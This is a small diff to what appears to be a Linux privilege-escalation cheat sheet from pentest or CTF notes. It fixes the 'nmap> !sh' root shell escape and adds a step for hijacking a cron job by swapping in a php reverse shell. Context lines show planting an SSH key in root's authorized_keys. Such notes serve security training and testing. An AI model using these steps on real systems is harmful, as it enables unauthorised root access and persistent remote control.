@@ -14,7 +14,7 @@ sudo -l
 #    (root) NOPASSWD: /usr/bin/nmap
 # Google the application you can run as root, eg. nmap privilege escalation
 sudo nmap --interactive
-namp> !sh
+nmap> !sh
 ``` 
 #### Check which version/year of Linux for privesc exploits
 ```
@@ -33,4 +33,10 @@ cat /root/.ssh/id_rsa.pub
 # Paste it into your root/.ssh/authorized_keys file (create if necessary)
 # Then try and access through ssh from attacking machine
 ssh root@targetip
+```
+
+#### Check the crontab for cron jobs you can exploit
+```
+cat /etc/crontab
+# If you locate a cron job with a php command, replace it with a php reverse shell
 ```
